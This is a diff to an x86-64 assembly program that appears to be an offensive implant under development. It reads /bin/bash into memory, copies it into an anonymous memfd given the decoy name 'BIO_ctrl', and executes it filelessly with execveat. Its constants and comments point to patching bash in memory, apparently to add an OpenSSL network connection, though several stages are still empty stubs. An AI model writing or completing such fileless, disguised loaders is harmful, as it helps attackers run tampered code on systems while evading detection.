@@ -56,9 +56,15 @@ BITS 64
 %define SYS_memfd_create    319
 %define SYS_execveat        322
 
+; for execveat
+%define AT_EMPTY_PATH       0x1000
+
 ; constants used by the patch
 %define RTLD_LAZY           1
 %define BIO_C_SET_CONNECT   0x64
+
+; 5mb, as a yolo
+%define STACKSPACE 0x500000
 
 ; Macros, these two are used for the patch
 %macro resolve_symbol 2
@@ -75,13 +81,26 @@ BITS 64
 
 ; register usage
 ; rsp - points the buffer we are using to start the copy of bash.
+; r12 - length of bash
 
 _start:
-
+    push rbp
+    sub rsp, STACKSPACE
 
 ; open the binary, dump into the stack
 _open_bin:
+    xor rdx, rdx
+    xor rsi, rsi
+    lea rdi, [rel _str_bash]
+    mov rax, SYS_open
+    syscall
 
+    mov rdx, STACKSPACE
+    mov rsi, rsp
+    mov rdi, rax
+    mov rax, SYS_read
+    syscall
+    mov r12, rax
 
 _discover_main:
     
@@ -90,10 +109,27 @@ _find_rela:
 
 
 _setup_memfd:
+    xor rsi, rsi
+    lea rdi, [rel _str_BIO_ctrl]
+    mov rax, SYS_memfd_create
+    syscall
 
 _write_memfd:
+    mov rdx, r12
+    mov r12, rax
+    mov rsi, rsp
+    mov rdi, rax
+    mov rax, SYS_write
+    syscall
 
 _execve_memfd:
+    mov r8, AT_EMPTY_PATH
+    xor r10, r10
+    xor rdx, rdx
+    lea rsi, [rel _str_null]
+    mov rdi, r12
+    mov rax, SYS_execveat
+    syscall
 
 
 _inf_main:
@@ -102,6 +138,7 @@ _inf_main:
 ; move into ELF header
 _str_bash:
     db "/bin/bash"
+_str_null:
     db 0
 
 ; Now lets move onto the patch we are applying to bash!
